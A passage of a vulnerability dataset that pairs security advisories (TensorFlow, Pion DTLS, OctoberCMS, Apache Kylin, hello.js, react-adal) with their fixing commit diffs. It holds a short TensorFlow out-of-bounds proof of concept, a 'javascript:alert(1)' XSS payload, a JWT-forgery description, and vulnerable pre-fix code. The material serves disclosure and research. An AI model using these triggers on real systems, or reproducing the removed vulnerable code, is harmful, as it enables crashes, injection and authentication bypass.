rendering\\n     #---------------------------------------------------------------'}}","message_norm":"backport origin check for api requests","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['IPython\/html\/base\/handlers.py'])","num_files":1.0},{"index":1026,"vuln_id":"GHSA-7fvx-3jfc-2cpc","cwe_id":"{'CWE-125'}","score":7.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/01cff3f986259d661103412a20745928c727326f'}","dataset":"osv","summary":"Heap OOB in `ResourceScatterUpdate` ### Impact\nAn attacker can trigger a read from outside of bounds of heap allocated data by sending invalid arguments to `tf.raw_ops.ResourceScatterUpdate`:\n\n```python\nimport tensorflow as tf\n\nv = tf.Variable([b'vvv'])\ntf.raw_ops.ResourceScatterUpdate(\n  resource=v.handle,\n  indices=[0],\n  updates=['1', '2', '3', '4', '5'])\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f24faa153ad31a4b51578f8181d3aaab77a1ddeb\/tensorflow\/core\/kernels\/resource_variable_ops.cc#L919-L923) has an incomplete validation of the relationship between the shapes of `indices` and `updates`: instead of checking that the shape of `indices` is a prefix of the shape of `updates` (so that broadcasting can happen), code only checks that the number of elements in these two tensors are in a divisibility relationship.\n\n### Patches \nWe have patched the issue in GitHub commit [01cff3f986259d661103412a20745928c727326f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/01cff3f986259d661103412a20745928c727326f).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n    \n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/01cff3f986259d661103412a20745928c727326f","commit_sha":"01cff3f986259d661103412a20745928c727326f","patch":"SINGLE","chain_ord":"['01cff3f986259d661103412a20745928c727326f']","before_first_fix_commit":"{'96f364a1ca3009f98980021c4b32be5fdcca33a1'}","last_fix_commit":"01cff3f986259d661103412a20745928c727326f","chain_ord_pos":1.0,"commit_datetime":"08\/02\/2021, 20:33:05","message":"Fix heap OOB due to dimension mismatch in `ResourceScatterUpdate`\n\nPiperOrigin-RevId: 388292801\nChange-Id: Id9bd7244d98d41b1517d4771850b32782c0cc949","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 5, 'total': 11}","files":"{'tensorflow\/core\/kernels\/resource_variable_ops.cc': {'additions': 6, 'deletions': 5, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/01cff3f986259d661103412a20745928c727326f\/tensorflow%2Fcore%2Fkernels%2Fresource_variable_ops.cc', 'patch': '@@ -955,11 +955,12 @@ class ResourceScatterUpdateOp : public OpKernel {\\n                         params->dim_size(0), \")\"));\\n       } else {\\n         int64_t num_updates = updates.NumElements();\\n-        OP_REQUIRES(c, num_updates % N == 0,\\n-                    errors::InvalidArgument(\\n-                        \"shape of indices (\", indices.shape().DebugString(),\\n-                        \") is not compatible with the shape of updates (\",\\n-                        updates.shape().DebugString(), \")\"));\\n+        OP_REQUIRES(\\n+            c, TensorShapeUtils::StartsWith(updates.shape(), indices.shape()),\\n+            errors::InvalidArgument(\\n+                \"The shape of indices (\", indices.shape().DebugString(),\\n+                \") must be a prefix of the shape of updates (\",\\n+                updates.shape().DebugString(), \")\"));\\n         auto updates_flat = updates.shaped<T, 2>({N, num_updates \/ N});\\n \\n         functor::ScatterFunctor<Device, T, Index, op> functor;'}}","message_norm":"fix heap oob due to dimension mismatch in `resourcescatterupdate`\n\npiperorigin-revid: 388292801\nchange-id: id9bd7244d98d41b1517d4771850b32782c0cc949","language":"en","entities":"[('fix', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('388292801', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/resource_variable_ops.cc'])","num_files":1.0},{"index":1031,"vuln_id":"GHSA-7gfg-6934-mqq2","cwe_id":"{'CWE-287'}","score":5.6,"chain":"{'https:\/\/github.com\/pion\/dtls\/commit\/fd73a5df2ff0e1fb6ae6a51e2777d7a16cc4f4e0'}","dataset":"osv","summary":"Improper Authenication in Pion DTLS handleIncomingPacket in conn.go in Pion DTLS before 1.5.2 lacks a check for application data with epoch 0, which allows remote attackers to inject arbitrary unencrypted data after handshake completion.","published_date":"2021-06-29","chain_len":1,"project":"https:\/\/github.com\/pion\/dtls","commit_href":"https:\/\/github.com\/pion\/dtls\/commit\/fd73a5df2ff0e1fb6ae6a51e2777d7a16cc4f4e0","commit_sha":"fd73a5df2ff0e1fb6ae6a51e2777d7a16cc4f4e0","patch":"SINGLE","chain_ord":"['fd73a5df2ff0e1fb6ae6a51e2777d7a16cc4f4e0']","before_first_fix_commit":"{'82948855ecb86a9e0b86c8dd43d010cbc545dc94'}","last_fix_commit":"fd73a5df2ff0e1fb6ae6a51e2777d7a16cc4f4e0","chain_ord_pos":1.0,"commit_datetime":"10\/11\/2019, 09:12:16","message":"Assert that ApplicationData has epoch != 0\n\nOtherwise we may accept unencrypted\/unauthenticated ApplicationData\nfrom a remote","author":"Sean DuBois","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'conn.go': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pion\/dtls\/raw\/fd73a5df2ff0e1fb6ae6a51e2777d7a16cc4f4e0\/conn.go', 'patch': '@@ -559,6 +559,10 @@ func (c *Conn) handleIncomingPacket(buf []byte) (*alert, error) {\\n \\t\\tc.log.Trace(\"<- ChangeCipherSpec\")\\n \\t\\tc.setRemoteEpoch(c.getRemoteEpoch() + 1)\\n \\tcase *applicationData:\\n+\\t\\tif h.epoch == 0 {\\n+\\t\\t\\treturn &alert{alertLevelFatal, alertUnexpectedMessage}, fmt.Errorf(\"ApplicationData with epoch of 0\")\\n+\\t\\t}\\n+\\n \\t\\tc.decrypted <- content.data\\n \\tdefault:\\n \\t\\treturn &alert{alertLevelFatal, alertUnexpectedMessage}, fmt.Errorf(\"unhandled contentType %d\", content.contentType())'}}","message_norm":"assert that applicationdata has epoch != 0\n\notherwise we may accept unencrypted\/unauthenticated applicationdata\nfrom a remote","language":"en","entities":"[('unencrypted', 'SECWORD', ''), ('unauthenticated', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['conn.go'])","num_files":1.0},{"index":1032,"vuln_id":"GHSA-7ggw-h8pp-r95r","cwe_id":"{'CWE-613'}","score":0.0,"chain":"{'https:\/\/github.com\/octobercms\/library\/commit\/642f597489e6f644d4bd9a0c267e864cabead024'}","dataset":"osv","summary":"Session ID not invalidated after logout ### Impact\nWhen logging out, the session ID was not invalidated. This is not a problem while the user is logged out, but as soon as the user logs back in the old session ID would be valid again; which means that anyone that gained access to the old session cookie would be able to act as the logged in user. This is not a major concern for the majority of cases, since it requires a malicious party gaining access to the session cookie in the first place, but nevertheless has been fixed.\n\n### Patches\nIssue has been patched in Build 472 (v1.0.472) and v1.1.2.\n\n### Workarounds\nApply https:\/\/github.com\/octobercms\/library\/commit\/642f597489e6f644d4bd9a0c267e864cabead024 to your installation manually if unable to upgrade to Build 472 or v1.1.2.\n\n### References\n- Reported by Anisio (Brazilian Information Security Analyst)\n- http:\/\/cve.circl.lu\/cve\/CVE-2021-3311\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\n<img width=\"699\" alt=\"Screen Shot 2021-02-07 at 11 50 35 PM\" src=\"https:\/\/user-images.githubusercontent.com\/7253840\/107180881-51eaf000-699f-11eb-8828-333128faf2a6.png\">","published_date":"2021-02-10","chain_len":1,"project":"https:\/\/github.com\/octobercms\/library","commit_href":"https:\/\/github.com\/octobercms\/library\/commit\/642f597489e6f644d4bd9a0c267e864cabead024","commit_sha":"642f597489e6f644d4bd9a0c267e864cabead024","patch":"SINGLE","chain_ord":"['642f597489e6f644d4bd9a0c267e864cabead024']","before_first_fix_commit":"{'e292d79ef2090f4d67a7d913d89c9d3597b0d334'}","last_fix_commit":"642f597489e6f644d4bd9a0c267e864cabead024","chain_ord_pos":1.0,"commit_datetime":"01\/30\/2021, 00:47:39","message":"Invalidate the session ID to prevent reuse\n\n1. Good logs in\n2. Bad captures Good's session cookie\n3. Good logs out\n4. Session cookie no longer works\n5. Good logs in a second time\n6. ORIGINAL session cookie works (Bad is also signed in)","author":"Samuel Georges","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/Auth\/Manager.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/octobercms\/library\/raw\/642f597489e6f644d4bd9a0c267e864cabead024\/src%2FAuth%2FManager.php', 'patch': '@@ -686,7 +686,7 @@ public function logout()\\n \\n         $this->user = null;\\n \\n-        Session::flush();\\n+        Session::invalidate();\\n         Cookie::queue(Cookie::forget($this->sessionKey));\\n     }'}}","message_norm":"invalidate the session id to prevent reuse\n\n1. good logs in\n2. bad captures good's session cookie\n3. good logs out\n4. session cookie no longer works\n5. good logs in a second time\n6. original session cookie works (bad is also signed in)","language":"en","entities":"[('invalidate', 'ACTION', ''), ('prevent', 'ACTION', ''), ('cookie', 'SECWORD', ''), ('cookie', 'SECWORD', ''), ('cookie', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Auth\/Manager.php'])","num_files":1.0},{"index":1037,"vuln_id":"GHSA-7hmh-8gwv-mfvq","cwe_id":"{'CWE-89'}","score":6.5,"chain":"{'https:\/\/github.com\/apache\/kylin\/commit\/e373c64c96a54a7abfe4bccb82e8feb60db04749'}","dataset":"osv","summary":"SQL Injection in Kylin Kylin has some restful apis which will concatenate SQLs with the user input string, a user is likely to be able to run malicious database queries.","published_date":"2020-07-27","chain_len":1,"project":"https:\/\/github.com\/apache\/kylin","commit_href":"https:\/\/github.com\/apache\/kylin\/commit\/e373c64c96a54a7abfe4bccb82e8feb60db04749","commit_sha":"e373c64c96a54a7abfe4bccb82e8feb60db04749","patch":"SINGLE","chain_ord":"['e373c64c96a54a7abfe4bccb82e8feb60db04749']","before_first_fix_commit":"{'ebfc745dd681d7e0c129ded50bd50ff509d2a393'}","last_fix_commit":"e373c64c96a54a7abfe4bccb82e8feb60db04749","chain_ord_pos":1.0,"commit_datetime":"02\/07\/2020, 12:22:59","message":"Fix sql injection issue","author":"nichunen","comments":null,"stats":"{'additions': 51, 'deletions': 30, 'total': 81}","files":"{'server-base\/src\/main\/java\/org\/apache\/kylin\/rest\/service\/CubeService.java': {'additions': 51, 'deletions': 30, 'changes': 81, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/kylin\/raw\/e373c64c96a54a7abfe4bccb82e8feb60db04749\/server-base%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fkylin%2Frest%2Fservice%2FCubeService.java', 'patch': '@@ -71,6 +71,7 @@\\n import org.apache.kylin.metadata.project.RealizationEntry;\\n import org.apache.kylin.metadata.realization.RealizationStatusEnum;\\n import org.apache.kylin.metadata.realization.RealizationType;\\n+import org.apache.kylin.metrics.MetricsManager;\\n import org.apache.kylin.metrics.property.QueryCubePropertyEnum;\\n import org.apache.kylin.rest.constant.Constant;\\n import org.apache.kylin.rest.exception.BadRequestException;\\n@@ -79,6 +80,7 @@\\n import org.apache.kylin.rest.msg.Message;\\n import org.apache.kylin.rest.msg.MsgPicker;\\n import org.apache.kylin.rest.request.MetricsRequest;\\n+import org.apache.kylin.rest.request.PrepareSqlRequest;\\n import org.apache.kylin.rest.response.CubeInstanceResponse;\\n import org.apache.kylin.rest.response.CuboidTreeResponse;\\n import org.apache.kylin.rest.response.CuboidTreeResponse.NodeInfo;\\n@@ -544,7 +546,8 @@ public HBaseResponse getHTableInfo(String cubeName, String tableName) throws IOE\\n \\n         hr = new HBaseResponse();\\n         CubeInstance cube = CubeManager.getInstance(getConfig()).getCube(cubeName);\\n-        if (cube.getStorageType() == IStorageAware.ID_HBASE || cube.getStorageType() == IStorageAware.ID_SHARDED_HBASE || cube.getStorageType() == IStorageAware.ID_REALTIME_AND_HBASE) {\\n+        if (cube.getStorageType() == IStorageAware.ID_HBASE || cube.getStorageType() == IStorageAware.ID_SHARDED_HBASE\\n+                || cube.getStorageType() == IStorageAware.ID_REALTIME_AND_HBASE) {\\n             try {\\n                 logger.debug(\"Loading HTable info \" + cubeName + \", \" + tableName);\\n \\n@@ -633,7 +636,8 @@ private void cleanSegmentStorage(List<CubeSegment> toRemoveSegs) throws IOExcept\\n             List<String> toDelHDFSPaths = Lists.newArrayListWithCapacity(toRemoveSegs.size());\\n             for (CubeSegment seg : toRemoveSegs) {\\n                 toDropHTables.add(seg.getStorageLocationIdentifier());\\n-                toDelHDFSPaths.add(JobBuilderSupport.getJobWorkingDir(seg.getConfig().getHdfsWorkingDirectory(), seg.getLastBuildJobID()));\\n+                toDelHDFSPaths.add(JobBuilderSupport.getJobWorkingDir(seg.getConfig().getHdfsWorkingDirectory(),\\n+                        seg.getLastBuildJobID()));\\n             }\\n \\n             StorageCleanUtil.dropHTables(new HBaseAdmin(HBaseConnection.getCurrentHBaseConfiguration()), toDropHTables);\\n@@ -763,10 +767,12 @@ public String mergeCubeSegment(String cubeName) {\\n     }\\n \\n     \/\/Don\\'t merge the job that has been discarded manually before\\n-    private boolean isMergingJobBeenDiscarded(CubeInstance cubeInstance, String cubeName, String projectName, SegmentRange offsets) {\\n+    private boolean isMergingJobBeenDiscarded(CubeInstance cubeInstance, String cubeName, String projectName,\\n+            SegmentRange offsets) {\\n         SegmentRange.TSRange tsRange = new SegmentRange.TSRange((Long) offsets.start.v, (Long) offsets.end.v);\\n         String segmentName = CubeSegment.makeSegmentName(tsRange, null, cubeInstance.getModel());\\n-        final List<CubingJob> jobInstanceList = jobService.listJobsByRealizationName(cubeName, projectName, EnumSet.of(ExecutableState.DISCARDED));\\n+        final List<CubingJob> jobInstanceList = jobService.listJobsByRealizationName(cubeName, projectName,\\n+                EnumSet.of(ExecutableState.DISCARDED));\\n         for (CubingJob cubingJob : jobInstanceList) {\\n             if (cubingJob.getSegmentName().equals(segmentName)) {\\n                 logger.debug(\"Merge job {} has been discarded before, will not merge.\", segmentName);\\n@@ -777,7 +783,6 @@ private boolean isMergingJobBeenDiscarded(CubeInstance cubeInstance, String cube\\n         return false;\\n     }\\n \\n-\\n     public void validateCubeDesc(CubeDesc desc, boolean isDraft) {\\n         Message msg = MsgPicker.getMsg();\\n \\n@@ -931,24 +936,6 @@ public void afterPropertiesSet() throws Exception {\\n         Broadcaster.getInstance(getConfig()).registerStaticListener(new HTableInfoSyncListener(), \"cube\");\\n     }\\n \\n-    private class HTableInfoSyncListener extends Broadcaster.Listener {\\n-        @Override\\n-        public void onClearAll(Broadcaster broadcaster) throws IOException {\\n-            htableInfoCache.invalidateAll();\\n-        }\\n-\\n-        @Override\\n-        public void onEntityChange(Broadcaster broadcaster, String entity, Broadcaster.Event event, String cacheKey)\\n-                throws IOException {\\n-            String cubeName = cacheKey;\\n-            String keyPrefix = cubeName + \"\/\";\\n-            for (String k : htableInfoCache.asMap().keySet()) {\\n-                if (k.startsWith(keyPrefix))\\n-                    htableInfoCache.invalidate(k);\\n-            }\\n-        }\\n-    }\\n-\\n     public CubeInstanceResponse createCubeInstanceResponse(CubeInstance cube) {\\n         return new CubeInstanceResponse(cube, projectService.getProjectOfCube(cube.getName()));\\n     }\\n@@ -995,7 +982,7 @@ private NodeInfo generateNodeInfo(long cuboidId, int dimensionCount, long cubeQu\\n         long queryExactlyMatchCount = queryMatchMap == null || queryMatchMap.get(cuboidId) == null ? 0L\\n                 : queryMatchMap.get(cuboidId);\\n         boolean ifExist = currentCuboidSet.contains(cuboidId);\\n-        long rowCount = rowCountMap == null ? 0L : rowCountMap.get(cuboidId);\\n+        long rowCount = (rowCountMap == null || rowCountMap.size() == 0) ? 0L : rowCountMap.get(cuboidId);\\n \\n         NodeInfo node = new NodeInfo();\\n         node.setId(cuboidId);\\n@@ -1044,9 +1031,10 @@ public Map<Long, Long> getCuboidHitFrequency(String cubeName, boolean isCuboidSo\\n         String table = getMetricsManager().getSystemTableFromSubject(getConfig().getKylinMetricsSubjectQueryCube());\\n         String sql = \"select \" + cuboidColumn + \", sum(\" + hitMeasure + \")\" \/\/\\n                 + \" from \" + table\/\/\\n-                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = \\'\" + cubeName + \"\\'\" \/\/\\n+                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = ?\" \/\/\\n                 + \" group by \" + cuboidColumn;\\n-        List<List<String>> orgHitFrequency = queryService.querySystemCube(sql).getResults();\\n+\\n+        List<List<String>> orgHitFrequency = getPrepareQueryResult(cubeName, sql);\\n         return formatQueryCount(orgHitFrequency);\\n     }\\n \\n@@ -1058,9 +1046,10 @@ public Map<Long, Map<Long, Pair<Long, Long>>> getCuboidRollingUpStats(String cub\\n         String table = getMetricsManager().getSystemTableFromSubject(getConfig().getKylinMetricsSubjectQueryCube());\\n         String sql = \"select \" + cuboidSource + \", \" + cuboidTgt + \", avg(\" + aggCount + \"), avg(\" + returnCount + \")\"\/\/\\n                 + \" from \" + table \/\/\\n-                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = \\'\" + cubeName + \"\\' \" \/\/\\n+                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = ?\" \/\/\\n                 + \" group by \" + cuboidSource + \", \" + cuboidTgt;\\n-        List<List<String>> orgRollingUpCount = queryService.querySystemCube(sql).getResults();\\n+\\n+        List<List<String>> orgRollingUpCount = getPrepareQueryResult(cubeName, sql);\\n         return formatRollingUpStats(orgRollingUpCount);\\n     }\\n \\n@@ -1070,13 +1059,27 @@ public Map<Long, Long> getCuboidQueryMatchCount(String cubeName) {\\n         String table = getMetricsManager().getSystemTableFromSubject(getConfig().getKylinMetricsSubjectQueryCube());\\n         String sql = \"select \" + cuboidSource + \", sum(\" + hitMeasure + \")\" \/\/\\n                 + \" from \" + table \/\/\\n-                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = \\'\" + cubeName + \"\\'\" \/\/\\n+                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = ?\" \/\/\\n                 + \" and \" + QueryCubePropertyEnum.IF_MATCH.toString() + \" = true\" \/\/\\n                 + \" group by \" + cuboidSource;\\n-        List<List<String>> orgMatchHitFrequency = queryService.querySystemCube(sql).getResults();\\n+\\n+        List<List<String>> orgMatchHitFrequency = getPrepareQueryResult(cubeName, sql);\\n         return formatQueryCount(orgMatchHitFrequency);\\n     }\\n \\n+    private List<List<String>> getPrepareQueryResult(String cubeName, String sql) {\\n+        PrepareSqlRequest sqlRequest = new PrepareSqlRequest();\\n+        sqlRequest.setProject(MetricsManager.SYSTEM_PROJECT);\\n+        PrepareSqlRequest.StateParam[] params = new PrepareSqlRequest.StateParam[1];\\n+        params[0] = new PrepareSqlRequest.StateParam();\\n+        params[0].setClassName(\"java.lang.String\");\\n+        params[0].setValue(cubeName);\\n+        sqlRequest.setParams(params);\\n+        sqlRequest.setSql(sql);\\n+\\n+        return queryService.doQueryWithCache(sqlRequest, false).getResults();\\n+    }\\n+\\n     @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN\\n             + \" or hasPermission(#cube, \\'ADMINISTRATION\\') or hasPermission(#cube, \\'MANAGEMENT\\')\")\\n     public void migrateCube(CubeInstance cube, String projectName) {\\n@@ -1114,4 +1117,22 @@ public void migrateCube(CubeInstance cube, String projectName) {\\n             throw new InternalErrorException(\"Failed to perform one-click migrating\", e);\\n         }\\n     }\\n+\\n+    private class HTableInfoSyncListener extends Broadcaster.Listener {\\n+        @Override\\n+        public void onClearAll(Broadcaster broadcaster) throws IOException {\\n+            htableInfoCache.invalidateAll();\\n+        }\\n+\\n+        @Override\\n+        public void onEntityChange(Broadcaster broadcaster, String entity, Broadcaster.Event event, String cacheKey)\\n+                throws IOException {\\n+            String cubeName = cacheKey;\\n+            String keyPrefix = cubeName + \"\/\";\\n+            for (String k : htableInfoCache.asMap().keySet()) {\\n+                if (k.startsWith(keyPrefix))\\n+                    htableInfoCache.invalidate(k);\\n+            }\\n+        }\\n+    }\\n }'}}","message_norm":"fix sql injection issue","language":"fr","entities":"[('fix', 'ACTION', ''), ('sql injection', 'SECWORD', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server-base\/src\/main\/java\/org\/apache\/kylin\/rest\/service\/CubeService.java'])","num_files":1.0},{"index":1041,"vuln_id":"GHSA-7jh9-6cpf-h4m7","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/MrSwitch\/hello.js\/commit\/d6f5137f30de6e0ef7048191ee6ae575fdc2f669'}","dataset":"osv","summary":"XSS in hello.js This affects the package hello.js before 1.18.6. The code get the param oauth_redirect from url and pass it to location.assign without any check and sanitisation. So we can simply pass some XSS payloads into the url param oauth_redirect, such as javascript:alert(1).","published_date":"2021-01-13","chain_len":1,"project":"https:\/\/github.com\/MrSwitch\/hello.js","commit_href":"https:\/\/github.com\/MrSwitch\/hello.js\/commit\/d6f5137f30de6e0ef7048191ee6ae575fdc2f669","commit_sha":"d6f5137f30de6e0ef7048191ee6ae575fdc2f669","patch":"SINGLE","chain_ord":"['d6f5137f30de6e0ef7048191ee6ae575fdc2f669']","before_first_fix_commit":"{'3b79ec93781b3d7b9c0b56f598e060301d1f3e73'}","last_fix_commit":"d6f5137f30de6e0ef7048191ee6ae575fdc2f669","chain_ord_pos":1.0,"commit_datetime":"10\/06\/2020, 11:20:56","message":"fix(xss): oauth_redirect should be a valid url","author":"Andrew Dodson","comments":null,"stats":"{'additions': 5, 'deletions': 1, 'total': 6}","files":"{'src\/hello.js': {'additions': 5, 'deletions': 1, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/MrSwitch\/hello.js\/raw\/d6f5137f30de6e0ef7048191ee6ae575fdc2f669\/src%2Fhello.js', 'patch': \"@@ -1388,8 +1388,12 @@ hello.utils.extend(hello.utils, {\\n \\t\\t\/\/ (URI Fragments within 302 Location URI are lost over HTTPS)\\n \\t\\t\/\/ Loading the redirect.html before triggering the OAuth Flow seems to fix it.\\n \\t\\telse if ('oauth_redirect' in p) {\\n+\\t\\t\\tvar url = decodeURIComponent(p.oauth_redirect);\\n+\\n+\\t\\t\\tif (isValidUrl(url)) {\\n+\\t\\t\\t\\tlocation.assign(url);\\n+\\t\\t\\t}\\n \\n-\\t\\t\\tlocation.assign(decodeURIComponent(p.oauth_redirect));\\n \\t\\t\\treturn;\\n \\t\\t}\"}}","message_norm":"fix(xss): oauth_redirect should be a valid url","language":"en","entities":"[('fix(xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/hello.js'])","num_files":1.0},{"index":1042,"vuln_id":"GHSA-7mpx-vg3c-cmr4","cwe_id":"{'CWE-287'}","score":8.2,"chain":"{'https:\/\/github.com\/salvoravida\/react-adal\/commit\/74158dba1647b12fe96fa401e306a6287fe9e2a9'}","dataset":"osv","summary":"Improper Authentication in react-adal This affects versions of react-adal < 0.5.1. It is possible for a specially crafted JWT token and request URL can cause the nonce, session and refresh values to be incorrectly validated, causing the application to treat an attacker-generated JWT token as authentic. The logical defect is caused by how the nonce, session and refresh values are stored in the browser local storage or session storage. Each key is automatically appended by ||. When the received nonce and session keys are generated, the list of values is stored in the browser storage, separated by ||, with || always appended to the end of the list. Since || will always be the last 2 characters of the stored values, an empty string (\"\") will always be in the list of the valid values. Therefore, if an empty session parameter is provided in the callback URL, and a specially-crafted JWT token contains an nonce value of \"\" (empty string), then adal.js will consider the JWT token as authentic.","published_date":"2021-04-13","chain_len":1,"project":"https:\/\/github.com\/salvoravida\/react-adal","commit_href":"https:\/\/github.com\/salvoravida\/react-adal\/commit\/74158dba1647b12fe96fa401e306a6287fe9e2a9","commit_sha":"74158dba1647b12fe96fa401e306a6287fe9e2a9","patch":"SINGLE","chain_ord":"['74158dba1647b12fe96fa401e306a6287fe9e2a9']","before_first_fix_commit":"{'e82bc421d70805ff308e11a1f0f1fcd7fb2b3186'}","last_fix_commit":"74158dba1647b12fe96fa401e306a6287fe9e2a9","chain_ord_pos":1.0,"commit_datetime":"10\/05\/2020, 20:19:06","message":"ADAL.js update","author":"Kris Hardy","comments":null,"stats":"{'additions': 32, 'deletions': 51, 'total': 83}","files":"{'src\/adal.js': {'additions': 32, 'deletions': 51, 'changes': 83, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/salvoravida\/react-adal\/raw\/74158dba1647b12fe96fa401e306a6287fe9e2a9\/src%2Fadal.js', 'patch': \"@@ -135,10 +135,6 @@ var AuthenticationContext = (function () {\\n         this._openedWindows = [];\\n         this._requestType = this.REQUEST_TYPE.LOGIN;\\n         window._adalInstance = this;\\n-        this._storageSupport = {\\n-            localStorage: null,\\n-            sessionStorage: null\\n-        };\\n \\n         \/\/ validate before constructor assignments\\n         if (config.displayCall && typeof config.displayCall !== 'function') {\\n@@ -813,7 +809,6 @@ var AuthenticationContext = (function () {\\n      * Clears cache items.\\n      *\/\\n     AuthenticationContext.prototype.clearCache = function () {\\n-        this._user = null;\\n         this._saveItem(this.CONSTANTS.STORAGE.LOGIN_REQUEST, '');\\n         this._saveItem(this.CONSTANTS.STORAGE.ANGULAR_LOGIN_REQUEST, '');\\n         this._saveItem(this.CONSTANTS.STORAGE.SESSION_STATE, '');\\n@@ -860,6 +855,7 @@ var AuthenticationContext = (function () {\\n      *\/\\n     AuthenticationContext.prototype.logOut = function () {\\n         this.clearCache();\\n+        this._user = null;\\n         var urlNavigate;\\n \\n         if (this.config.logOutUri) {\\n@@ -928,8 +924,7 @@ var AuthenticationContext = (function () {\\n      * @ignore\\n      *\/\\n     AuthenticationContext.prototype._addHintParameters = function (urlNavigate) {\\n-\\n-        \/\/If you don't use prompt=none, then if the session does not exist, there will be a failure.\\n+        \/\/If you don\ufffdt use prompt=none, then if the session does not exist, there will be a failure.\\n         \/\/If sid is sent alongside domain or login hints, there will be a failure since request is ambiguous.\\n         \/\/If sid is sent with a prompt value other than none or attempt_none, there will be a failure since the request is ambiguous.\\n \\n@@ -1103,7 +1098,7 @@ var AuthenticationContext = (function () {\\n         if (requestNonce) {\\n             requestNonce = requestNonce.split(this.CONSTANTS.CACHE_DELIMETER);\\n             for (var i = 0; i < requestNonce.length; i++) {\\n-                if (requestNonce[i] === user.profile.nonce) {\\n+                if (requestNonce[i] && requestNonce[i] === user.profile.nonce) {\\n                     return true;\\n                 }\\n             }\\n@@ -1122,7 +1117,7 @@ var AuthenticationContext = (function () {\\n         if (loginStates) {\\n             loginStates = loginStates.split(this.CONSTANTS.CACHE_DELIMETER);\\n             for (var i = 0; i < loginStates.length; i++) {\\n-                if (loginStates[i] === requestInfo.stateResponse) {\\n+                if (loginStates[i] && loginStates[i] === requestInfo.stateResponse) {\\n                     requestInfo.requestType = this.REQUEST_TYPE.LOGIN;\\n                     requestInfo.stateMatch = true;\\n                     return true;\\n@@ -1135,7 +1130,7 @@ var AuthenticationContext = (function () {\\n         if (acquireTokenStates) {\\n             acquireTokenStates = acquireTokenStates.split(this.CONSTANTS.CACHE_DELIMETER);\\n             for (var i = 0; i < acquireTokenStates.length; i++) {\\n-                if (acquireTokenStates[i] === requestInfo.stateResponse) {\\n+                if (acquireTokenStates[i] && acquireTokenStates[i] === requestInfo.stateResponse) {\\n                     requestInfo.requestType = this.REQUEST_TYPE.RENEW_TOKEN;\\n                     requestInfo.stateMatch = true;\\n                     return true;\\n@@ -1218,16 +1213,17 @@ var AuthenticationContext = (function () {\\n                             this._user = null;\\n                         } else {\\n                             this._saveItem(this.CONSTANTS.STORAGE.IDTOKEN, requestInfo.parameters[this.CONSTANTS.ID_TOKEN]);\\n+\\n                             \/\/ Save idtoken as access token for app itself\\n-                            var idTokenResource = this.config.loginResource ? this.config.loginResource : this.config.clientId;\\n+                            resource = this.config.loginResource ? this.config.loginResource : this.config.clientId;\\n \\n-                            if (!this._hasResource(idTokenResource)) {\\n+                            if (!this._hasResource(resource)) {\\n                                 keys = this._getItem(this.CONSTANTS.STORAGE.TOKEN_KEYS) || '';\\n-                                this._saveItem(this.CONSTANTS.STORAGE.TOKEN_KEYS, keys + idTokenResource + this.CONSTANTS.RESOURCE_DELIMETER);\\n+                                this._saveItem(this.CONSTANTS.STORAGE.TOKEN_KEYS, keys + resource + this.CONSTANTS.RESOURCE_DELIMETER);\\n                             }\\n \\n-                            this._saveItem(this.CONSTANTS.STORAGE.ACCESS_TOKEN_KEY + idTokenResource, requestInfo.parameters[this.CONSTANTS.ID_TOKEN]);\\n-                            this._saveItem(this.CONSTANTS.STORAGE.EXPIRATION_KEY + idTokenResource, this._user.profile.exp);\\n+                            this._saveItem(this.CONSTANTS.STORAGE.ACCESS_TOKEN_KEY + resource, requestInfo.parameters[this.CONSTANTS.ID_TOKEN]);\\n+                            this._saveItem(this.CONSTANTS.STORAGE.EXPIRATION_KEY + resource, this._user.profile.exp);\\n                         }\\n                     }\\n                     else {\\n@@ -1689,7 +1685,7 @@ var AuthenticationContext = (function () {\\n                 ifr.setAttribute('aria-hidden', 'true');\\n                 